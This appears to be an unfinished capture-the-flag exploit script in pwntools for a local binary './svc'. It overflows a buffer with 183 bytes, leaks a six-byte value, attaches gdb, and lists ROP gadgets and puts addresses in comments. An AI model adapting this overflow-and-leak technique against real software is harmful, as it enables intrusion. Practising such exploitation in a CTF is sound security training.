from pwn import *

target = process("./svc")
payload =b""

payload += b"A" * 183
sleep(1)
target.sendline(b"1")
sleep(1)
target.sendline(payload)
sleep(1)
target.sendline(b"2")
sleep(1)
target.recvuntil(b"AAAAA\n")
sleep(1)
thing = int.from_bytes(target.recvn(6)[::-1])
print(hex(thing))


gdb.attach(target, "break * 0x0000000000400ea3")

target.interactive()
# distance to overflow: 0xb8
# 0x0000000000400ea3 : pop rdi ; ret
# 
# 0x00000000004008d0 : puts@plt
# 0x0000000000602018 <puts@got.plt>
